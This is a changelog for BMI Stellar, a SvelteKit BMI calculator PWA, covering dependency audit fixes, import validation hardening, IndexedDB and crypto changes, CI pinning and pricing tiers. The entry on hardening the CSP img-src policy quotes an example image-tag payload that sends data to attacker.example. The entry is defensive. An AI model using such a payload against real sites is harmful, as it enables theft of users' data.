# Changelog

All notable changes to **BMI Stellar** are documented in this file.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) principles, adapted to the project's `feat / fix / chore / docs / refactor / style` commit conventions. Versions are synchronized from `package.json` via `scripts/dev/version-to.ts`. Release tags follow `Stellar-v<major>.<minor>`.

For the full architectural context behind any release, see [`docs/furthermore.md`](docs/furthermore.md). For dormant-maintenance guidance, see [`DORMANT.md`](DORMANT.md).

---

## [Unreleased]

### Changed

- **GitHub Actions pins healed to full 40-hex SHAs, with the zelynic-aligned
  self-heal engine (night-improve-2).** All 30 `uses:` pins across the 8
  workflows moved from floating version tags to immutable release commit SHAs
  (`actions/checkout@<sha> # v7.0.1, SHA pin` style), with the release tag
  kept readable as a trailing comment. The heal landed through the new
  `scripts/ci/actions-version-sweep.sh` (`--dry-run` / `--apply`, annotated
  tags peeled, fail-closed write guard) and `scripts/gates/check-actions-pins
  .sh` now enforces the shape (warn locally, strict in CI); both were proven
  live against a planted tag pin. Several pins had silently drifted 2-3
  majors behind (checkout v5, cache v5, download-artifact v6, upload-artifact
  v5, setup-node v6) because the old weekly lane only bumped inside a major;
  the rewired self-heal workflow now crosses majors the way zelynic's engine
  does and commits as `Internal research:` per the house convention.

- **LOC discipline tightened to the zelynic three-tier law (night-improve-7).**
  The single 1000-line cap is now three tiers: the 1000-line hard cap stays;
  a 600-line ratchet (`scripts/loc-ratchet.json`) records the 14 legacy core
  files at or above 600 lines at their current size and they may never grow;
  and `scripts/gates/check-scripts-loc.sh` enforces the 1000-line cap for
  `scripts/**` with zelynic's `# LOC_EXEMPT:` self-declared IOU marker. New
  source files must stay under 600 lines; existing debt can only shrink.

- **scripts/ tree reorganization (zelynic-aligned layout).** The flat
  `scripts/` directory now follows the zelynic gate discipline: atomic gates
  live in `scripts/gates/` (one concern per file), the version manager moved
  to `scripts/dev/version-to.ts` (renamed from `scripts/bmi-update-version.ts`;
  the `bun run bmi-update-version` and `bmi-bump:*` aliases keep working),
  shared gate code lives in `scripts/lib/`, and `scripts/ci/` is reserved for
  CI-lane helpers. All `package.json` script paths and living-doc references
  were re-pointed; no gate behavior changed.

### Fixed

- **CI audit failures** — `bun audit` reported 17 vulnerabilities in transitive deps after a dormant period. Bumped `overrides` (undici ^7.29.0, tar ^7.5.22, postcss ^8.5.25, brace-expansion ^5.0.9) and dev-dep `@sveltejs/kit` 2.60.1 → 2.70.2. Result: 0 vulnerabilities. _(eff8369)_
- **Missing local gatekeeper** — added `scripts/build.sh` (5 modes: `check-all`, `quick`, `audit`, `test`, `build`) that mirrors `.github/workflows/ci.yml` step-by-step. _(eff8369)_
- **Error page type-check failure** — svelte-check 4.7.x rejects type arguments on `$props()`, breaking type-check in CI and the weekly maintenance workflow. Replaced the generic form with a type annotation on the `$props()` variable in `src/routes/+error.svelte`; the props object stays intact because destructuring is disallowed in SvelteKit route components. _(d7b6836)_
- **Dependency audit red gate** — `bun audit` reported 22 advisories (7 high) against the committed lockfile. Refreshed within pinned ranges via targeted override bumps: vitest 4.1.12, undici ^7.29.1, brace-expansion ^5.0.12, devalue ^5.9.3, source-map-js ^1.2.2, postcss-selector-parser ^7.1.6, `@humanfs/node` ^0.16.8. Advisories with no fix inside the pinned majors (glob, minimatch, SvelteKit 2, deepmerge) are now tracked by the audit policy instead of failing the gate. _(7ae8ed0)_
- **License upgrade to AGPL-3.0** — upgraded the project license from GPL-3.0-only to AGPL-3.0-only (GNU Affero General Public License v3, 19 November 2007): replaced `LICENSE` with the canonical AGPL text, rewrote the SPDX header in every core file, set the manifest license to `AGPL-3.0-only`, updated the user-facing license label in the About section, and synced README, TRADEMARK.md, and DORMANT.md references. Historical entries keep their original license names. _(this commit)_
- **Untrusted import file hardening** — history import/export record validation only checked `typeof === 'number'`, so JSON literals like `1e999` (parsed as `Infinity`) and far-future timestamps from hostile or corrupted files could pass the legacy checksum gate and persist into history storage, corrupting `Date` handling, sparkline scaling, and CSV/ISO formatting downstream. Record validation now rejects non-finite values, enforces the same bounds the calculator applies (`INPUT_LIMITS`), caps timestamps with a 24-hour clock-skew allowance, and validates the age field. CSV category mapping now reuses the shared `classifyBmi`/`getCategoryLabel` helpers instead of duplicating the classification thresholds. Six regression tests cover the non-finite, out-of-bounds, far-future, and negative-age vectors plus the no-over-tightening control. _(this commit)_
- **Validated history read path** — the display and write-back reads (`BmiHistorySparkline`, `BmiSnapshot`, `BmiForm` export summary, `saveBmiToHistory`) still trusted raw storage contents, so records that predate the import hardening or enter via IndexedDB backup restore could reach the UI as an Infinity best-BMI badge, broken sparkline scaling, or endlessly re-persisted poison. Added a single validated accessor `readBmiHistory()` in `bmi-history.ts` that reuses the hardened `isValidRecord` guard from `history-io.ts`; all four consumers now share it and every save purges poison from storage (self-healing). Six tests cover the poisoned read via a raw `1e999` JSON literal, non-array payloads, malformed JSON, legacy no-age records, the self-healing save, and signature dedupe. _(this commit)_

### Changed

- **README test-lane counts synced** — 464/30 → 512/34 after the paranoid-masterclass hardening suites (math precision, IndexedDB atomicity, KDF worker transport, PWA offline logic). _(this commit)_
- **PWA update logic covered and offline path proven** — new 12-test suite covers commit-id normalization, exact-equality commit matching (prefix collisions rejected), version/commit update decisions, and the offline update check (explicit `offline` status with zero fetches). Verified live in airplane mode: after the service worker precached 69 assets, the app reloaded from cache and generated a real `bmi-encrypted-v1` backup (Argon2id 64 MiB × 3 + AES-256-GCM) with the network severed. _(this commit)_
- **Argon2id offloaded to an inline Web Worker** — the 64 MiB × 3 key derivation blocked the main thread for ~4.3 s during encrypted export/import (measured on a production build). It now runs in a bundled inline worker (`?worker&inline`, offline-safe): the same import shows a 50 ms max frame gap with the UI fully responsive. Worker failures fall back to the main thread with byte-identical hashes; construction failures retry, post-start crashes latch the worker off for the session. AES-GCM remains async WebCrypto. _(this commit)_
- **IndexedDB writes settle on transaction commit** — `dbSet`, `dbRemove`, `dbMetaSet`, `dbBackupSave`, and `dbBackupDelete` resolved on request-level success, which fires _before_ the transaction commits; a quota abort or browser kill during the commit phase resolved the write successfully while the data silently rolled back. All five helpers now resolve on `tx.oncomplete` and reject on `tx.onabort`/`tx.onerror`, and a new 8-test atomicity suite proves rollback: an aborted write leaves the previous value intact and a mid-commit failure is always observed by the caller. _(b62bdc4)_
- **Exact unit conversion constants and unit-tested TDEE math** — replaced the truncated pound constant (0.453592) with the exact 1959 international value (0.45359237), removed its duplicated inline copy from the BMR block, and extracted the Mifflin-St Jeor BMR and the five published activity factors (1.2/1.375/1.55/1.725/1.9) into pure, unit-tested functions in `bmi-calculator.ts`. New 21-test precision suite covers extreme-but-valid inputs (50 cm, 250 cm, 10 kg, 300 kg, unit ceilings), sub-1e-12 conversion error, and exact BMR/TDEE values at ages 1–120. _(4cf48c1)_
- **CSP `img-src` hardened to an explicit allowlist** — the production Content Security Policy allowed `img-src https:`, letting any HTTPS host serve images. If an XSS had ever been found, an attacker could have exfiltrated data through image loads (`<img src="https://attacker.example/log?data=…">`). A full source sweep confirmed nothing loads remote images (hero logo, favicons, manifest icons, and wallpapers are all same-origin; the share card exports through `blob:`; Ko-fi appears only as a README badge, never inside the app), so the wildcard is now removed: `img-src 'self' data: blob:`, with named Vercel preview hosts added only on non-production deployments. Verified live against a production build: the strict header is served, logo and wallpapers render, and the Save Image blob export runs with zero CSP violations. CSP strictness documented in SECURITY.md and README.md. _(this commit)_
- **Documentation sync** — corrected 11 discrepancies across README.md, DORMANT.md, BRANDING.md, and docs/furthermore.md (test counts, CSS cascade count, storage keys, lazy-load registry, CI/CD workflow inventory, accent color hex values, release-process gate). _(e29e94b)_
- **Policy-gated dependency audit** — `audit:deps` now runs `scripts/audit-deps.ts` instead of raw `bun audit`: critical/high/moderate advisories fail the gate unless an unexpired entry in `scripts/audit-allowlist.json` accepts them, low advisories warn. Expired, stale, or severity-mismatched allowlist entries fail closed, so the acceptance list cannot rot into a permanent silence switch. _(this commit)_
- **CI timeout hardening** — added `timeout-minutes` to the jobs that lacked it (CI 15, Documentation CI 10, release validate-tag 5, release build/upload 20), so a hung runner fails fast instead of burning the 6-hour GitHub default. Every scheduled and push-triggered workflow now carries an explicit job timeout. Also bumped the PWA manifest cache-buster in `app.html` from `21.5.0` to the current version so installed clients re-fetch `manifest.json`. _(this commit)_
- **Self-heal push hardening** — the weekly action-version workflow now fetches and rebases between push attempts and exits non-zero when all attempts are exhausted, instead of reporting a silent success while the version bump never landed. _(this commit)_
- **Offline precache diet** — moved the 1254×1254 brand master (`bmi-logo-masters.png`, 1.0 MB) from `static/assets/` to `docs/assets/`. The service worker precaches every file under `static/`, and the master was referenced by no manifest, page, or style — only by the branding docs. Web-facing PWA derivatives (192 through 1024) stay in `static/assets/` unchanged, so install icons, favicon, and maskable icons stay pixel-identical; installs now ship about 1 MB less on first load. BRANDING.md updated to the new path. _(this commit)_
- **README synced to the zelynic convention** — rebuilt `README.md` on the owner's mature-project template: license header comments, an AI-agents notice, centered hero with tagline and flavor quote, badge row (version + license + Ko-fi), a "Why bmi?" section with a mechanism-anchored edge table and a vs-typical-tools comparison, honest limitations (screening metrics, unencrypted at-rest local storage, forgeable legacy checksums), a layered architecture diagram, philosophy (IS / NEVER BE + maintenance mode), a test-lane table (464 tests, 30 suites — refreshed from the stale 452/29), release verification, the trademark and forking policy, and the closing documentation-disclaimer block. Added `AI_AGENTS_READ_THIS.md` adapted to bmi's single AGPL-3.0-only license. Restored the three version-sync anchors (`BMI Stellar v21.8` display string, `badge/version-v21.8-` badge, `alt="Version v21.8"`) so `bmi-update-version` syncs the README again instead of skipping it — verified with a `--dry-run` reporting all three "already current". BRANDING.md: removed the stale all-caps-hero row that referenced a hero the README no longer has. _(this commit)_

### License

- **Pricing restructured to the White-Label Focus ladder.** BMI Stellar
  is positioned as local-first health infrastructure. Added Professional
  ($999), Business ($2,199), Enterprise Internal ($14,999), and
  White-Label/OEM ($49,999/year or $99,999 one-time + 20%). Personal
  (Free) and Individual ($99) unchanged. Docs-only; no code changes.

### Removed

- **Dormant static-deploy config** — removed `svelte.config.static.js` and its `@sveltejs/adapter-static` devDependency. The project deploys via `@sveltejs/adapter-vercel` (`svelte.config.js`); the alternate static config was referenced by no build, script, or doc — only by tolerant workflow path filters and a `|| true` release-staging copy, all of which are cleaned up in the same change. _(this commit)_

---

## [21.7.0] — Stellar-v21.7

### Fixed

- **svelte-check compatibility** — pinned Node.js to v22 LTS in CI after `svelte-check` started failing on Node 24. _(3f4a1e4)_
- **Maintenance deps regression** — reverted a broken weekly dependency bump and re-pinned `typescript` to a known-good version. _(f16f9b1)_
- **Lint error in `+error.svelte`** — resolved `svelte/valid-prop-names-in-kit-pages` after a SvelteKit schema change. _(5ea270f)_

### Changed

- **Release workflow simplification** — streamlined `release.yml` and accompanying docs. _(4fdd307)_
- **Test suite cleanup** — removed future-roadmap placeholders and duplicate test bloat. _(2a19413)_

### Chore

- Weekly dependency refresh, GitHub Action version self-heal, prettier formatting pass on `+error.svelte`. _(c56b18f, ef385b8, e5297f8, ad9e263)_

---

## [21.6.0] — Stellar-v21.6

### Fixed

- **10 dependency vulnerabilities** — resolved advisories in `undici`, `tar`, and `vite` via `package.json` overrides without breaking the frozen lockfile. _(30d77eb)_
- **esbuild GHSA-gv7w-rqvm-qjhr** — pinned `esbuild` to a patched version. _(78d4f02)_

### Changed

- **Workflow rename** — `auto-update.yml` → `maintenance.yml` for ecosystem consistency. _(2e76156)_
- **Owner contact email** — obfuscated to deter scraping. _(5a7e0eb)_

### Chore

- Three weekly lockfile refreshes via the new maintenance workflow. _(fca70bd, 11dad7e, abce00e)_

---

## [21.5.0] — Stellar-v21.5

### Fixed

- **PWA false-positive update loop** — `v21.5` shipped a regression where the service-worker update detector repeatedly prompted users to refresh. Reworked the version-stability check so first-load false positives no longer fire. _(6280a95)_
- **Storage write ordering** — hardened the localStorage write sequence to prevent partial writes during tab teardown. _(1aa1d8f)_
- **PWA commit compare** — fixed a bug where comparing service-worker commits could miss an update when the byte length was identical but the hash differed. _(1aa1d8f)_
- **BMI null safety** — added explicit null guards in the BMI calculation pipeline to prevent `NaN` propagation when inputs are cleared mid-typing. _(1aa1d8f)_

### Changed

- **CI naming and author identity** — standardized workflow names and commit author identity for the maintenance bot. _(91a38a5)_
- **Security docs tightened** — refined the privacy boundary and scope sections in `SECURITY.md`. _(9e898a3)_

---

## [21.4.0] — Stellar-v21.4

### Changed

- **Rebrand to masters logo** — replaced the legacy `bmi-logo-masters.png` with a new 1254×1254 RGBA master asset, regenerated all derived sizes (128, 180, 192, 216, 256, 512, 512-maskable, 1024), and removed legacy asset files. _(84418e6, dd87777, 87f5dd0, 4005f15, 92667d6)_
- **Touch targets** — improved minimum tap-target sizes across the pager and form controls. _(84418e6)_

### Added

- **Trademark and branding guidelines** — introduced `TRADEMARK.md` and `BRANDING.md` governing name, logo, and color usage. _(0aa47ed, 8ac6387)_

### Chore

- Hardened direct dependency update flow, tightened workflow path filters, simplified `.gitignore`, normalized nightbot maintenance, prettier pass on `furthermore.md`. _(d5a2fed, 3c224e1, 4c0c12c, e245c9d, c7fd036, d76ad8a, afc4ff7, a404ad1)_

---

## [21.3.0] — Stellar-v21.3

### Added

- **Dormant maintenance guide** — introduced `DORMANT.md` as the canonical wake-up checklist for long quiet periods. _(4eed226)_
- **PWA audits hardened** — added `check-pwa-offline-shell.ts` and tightened the offline-shell verification gate. _(b6f9ae6)_

### Changed

- **Direct weekly maintenance** — switched the dependency-update workflow from PR-first to direct-commit (with read-only validation) to reduce friction. _(cc49e3a)_
- **License consolidation** — removed a stray `LICENSE.md` and consolidated on the GPL-3.0 `LICENSE` file. _(6c42435, 6216873)_

### Chore

- Six weekly dependency refreshes, multiple `chore(deps)` bumps. _(47b6b79, 8d2c438, c90cdb0, 4d60e3c, d3e6515, 98d12c8, ab72db0, 04276c8)_
- Misc refactors across utilities. _(8ad6554)_
- README logo alt-text and badges. _(ab72db0, 04276c8)_

---

## [21.2.0] — Stellar-v21.2

### Fixed

- **Mobile viewport edge** — polished layout overflow on small-width viewports. _(054eaa2)_
- **UX consistency cleanup** — visual pass across pager, gauge, and form. _(4108783)_

### Changed

- **Verify script robustness** — improved error reporting in the local verify script. _(ede7f50)_

### Chore

- Dependency update. _(321d13f)_

---

## [21.1.0] — Stellar-v21.1

### Fixed

- **Masterclass UI improvements** — multiple UX/UI consistency passes (v1–v4 iteration cycle). _(183bd03, 0eb237e, 588eb1f, 777e002)_
- **Notes feature** — small fixes for the in-app notes flow. _(222ae5d)_

---

## [21.0.0] — Stellar-v21.0

### Fixed

- **Service worker in dev preview** — fixed a bug where the service worker was incorrectly hooked in `vite dev`. _(62925f4)_
- **Accessibility / i18n / consistency** — critical pass on focus-visible contracts, universal unit symbols, removal of dead props, and documentation sync. _(31ca18b)_
- **ESLint formatting** — fixed formatting violations flagged by ESLint. _(46cdf7c)_
- **Twelve UX/UI consistency iterations** — comprehensive visual polish across all sections (v1 through v12). _(793412e, da9f1b3, 1cfdb30, eec297d, 0961987, da9f1b3, 06b1de8, 22c74fe)_

### Changed

- **Documentation masterclass rewrite** — rewrote all 5 core documentation files (README, BRANDING, SECURITY, TRADEMARK, furthermore) for accuracy and tone. _(4dfd3ec, bf622cd, bc72a10)_

### Chore

- Dependency update. _(508ed8f, 0299db1)_

---

## Maintenance Policy

This project follows a low-touch maintenance cadence. Between minor releases, automated workflows handle:

- **Weekly lockfile refresh** — `.github/workflows/maintenance.yml` runs `bun update --lockfile-only` every Monday 00:00 UTC, validates the result against the full CI gate, then commits directly to `main`.
- **Daily security audit** — `.github/workflows/security-audit.yml` runs `bun audit` + policy checks at 00:00 UTC.
- **GitHub Action self-heal** — `.github/workflows/self-heal-actions.yml` bumps action versions on patch/minor releases.

When waking the project after a dormant period, expect `bun audit` to flag advisories that were published in the interim — bump `overrides` in `package.json` (never weaken crypto deps) and re-run `./scripts/build.sh check-all`. Full guidance: [`DORMANT.md`](DORMANT.md).

---

_Link mapping: `[21.x.0]` corresponds to git tag `Stellar-v21.x`. Commits referenced by short SHA can be inspected via `git show <sha>`._
